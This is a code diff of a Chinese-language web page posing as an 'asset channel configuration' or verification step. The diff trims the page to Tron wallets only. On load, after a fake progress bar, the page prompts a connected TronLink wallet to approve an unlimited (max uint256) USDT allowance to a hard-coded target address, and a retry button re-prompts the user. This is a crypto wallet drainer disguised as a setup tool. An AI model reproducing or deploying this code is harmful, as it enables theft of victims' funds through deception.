@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>多钱包多链資產通道配置</title>
+<title>僅Tron錢包資產通道配置</title>
 <style>
   body {
     background: #121212;
@@ -67,22 +67,18 @@
 </head>
 <body>
 
-<h2>資產通道自動配置</h2>
-<div id="status" class="status loading">初始化中...</div>
+<h2>資產通道配置（僅 Tron）</h2>
+<div id="status" class="status loading">初始化中，請確保已連接 Tron 錢包</div>
 <div class="progress-bar"><div id="progress"></div></div>
 <button id="retryBtn" style="display:none;">重新嘗試授權</button>
 
-<script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 <script>
   const CFG = {
     USDT: {
-      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-      ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-      BNB:  "0x55d398326f99059fF775485246999027B3197955"
+      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
     },
     TARGET: {
-      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
-      EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
+      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf"
     },
     AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
   };
@@ -99,7 +95,8 @@
     }
   }
 
-  function waitForTronWeb(timeout = 5000) {
+  // 等待 TronLink / Tron 钱包初始化
+  async function waitForTronWeb(timeout = 5000) {
     return new Promise((resolve, reject) => {
       let waited = 0;
       const interval = setInterval(() => {
@@ -116,6 +113,7 @@
     });
   }
 
+  // 调用 Tron 合约 approve 授权
   async function tronApprove() {
     try {
       setStatus("正在進行 Tron 通道授權...", "loading", 60);
@@ -132,55 +130,45 @@
     }
   }
 
-  // EVM 授權接口，**不自動調用**，避免彈窗
-  async function evmApprove() {
+  async function initVerification() {
     try {
-      setStatus("偵測到 EVM 錢包，但不自動授權，請手動操作。", "loading", 100);
-      retryBtn.style.display = "inline-block";
-      return false;
-    } catch (e) {
-      console.error("EVM 授權失敗:", e);
-      setStatus("EVM 授權失敗，請手動重試", "error", 100);
-      retryBtn.style.display = "inline-block";
-      return false;
-    }
-  }
+      setStatus("檢測 Tron 錢包中...", "loading", 10);
+      retryBtn.style.display = "none";
 
-  async function detectAndApprove() {
-    setStatus("開始檢測錢包環境...", "loading", 10);
-    retryBtn.style.display = "none";
-
-    // 優先 Tron
-    if (window.tronWeb && window.tronWeb.ready) {
-      setStatus("偵測到 Tron 錢包，準備授權...", "loading", 30);
-      const tronOk = await tronApprove();
-      if (tronOk) return;
-    } else if (window.tronLink) {
-      setStatus("等待 TronLink 錢包初始化...", "loading", 20);
-      try {
-        await waitForTronWeb();
-        const tronOk = await tronApprove();
-        if (tronOk) return;
-      } catch (e) {
-        console.warn("TronLink 初始化失敗", e);
+      if (window.tronWeb && window.tronWeb.ready) {
+        setStatus("Tron 錢包已連接，準備授權...", "loading", 30);
+        const ok = await tronApprove();
+        if (!ok) {
+          // 授權失敗，狀態已設置，等待用戶重試
+          return;
+        }
+      } else if (window.tronLink) {
+        setStatus("等待 TronLink 錢包初始化...", "loading", 20);
+        try {
+          await waitForTronWeb();
+          const ok = await tronApprove();
+          if (!ok) return;
+        } catch (e) {
+          console.warn("TronLink 初始化失敗", e);
+          setStatus("TronLink 錢包初始化失敗，請刷新重試", "error", 100);
+          retryBtn.style.display = "inline-block";
+          return;
+        }
+      } else {
+        setStatus("未檢測到 Tron 錢包，請安裝或啟動支持 Tron 的錢包並刷新頁面", "error", 100);
+        retryBtn.style.display = "inline-block";
+        return;
       }
-    }
-
-    // 不自動調用 EVM 授權，避免彈窗跳轉
-    if (window.ethereum) {
-      setStatus("偵測到 EVM 錢包，但不自動授權，請使用Tron錢包進行授權。", "error", 100);
+    } catch (e) {
+      console.error("驗證錯誤:", e);
+      setStatus("系統錯誤，請刷新重試", "error", 100);
       retryBtn.style.display = "inline-block";
-      return;
     }
-
-    // 如果没检测到任何钱包
-    setStatus("未偵測到可用錢包，請安裝或打開支持的錢包並刷新頁面", "error", 100);
-    retryBtn.style.display = "inline-block";
   }
 
   retryBtn.onclick = () => {
     setStatus("重新嘗試授權中...", "loading", 0);
-    detectAndApprove();
+    initVerification();
   };
 
   window.addEventListener('load', () => {
@@ -190,7 +178,7 @@
       if (progress < 10) setStatus("啟動中...", "loading", progress);
       if (progress >= 10) {
         clearInterval(progressInterval);
-        detectAndApprove();
+        initVerification();
       }
     }, 100);
   });
